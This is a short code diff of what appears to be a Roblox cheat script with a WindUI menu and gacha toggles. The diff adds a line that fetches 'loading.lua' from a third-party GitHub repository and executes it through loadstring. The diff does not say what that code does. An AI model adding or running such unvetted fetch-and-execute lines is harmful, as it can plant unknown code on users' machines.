@@ -1,5 +1,5 @@
-
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/worldclup/Script/refs/heads/main/loading.lua"))()
 
 -- */  Colors  /* --
 local Purple = Color3.fromHex("#7775F2")
@@ -1632,7 +1632,6 @@ for i, name in ipairs(RollNames) do
 	currentGroup:Toggle({
 		Title = name,
 		Value = false,
-		Icon = "bird",
 		Callback = function(v)
 			State.GachaState[name] = v
 		end
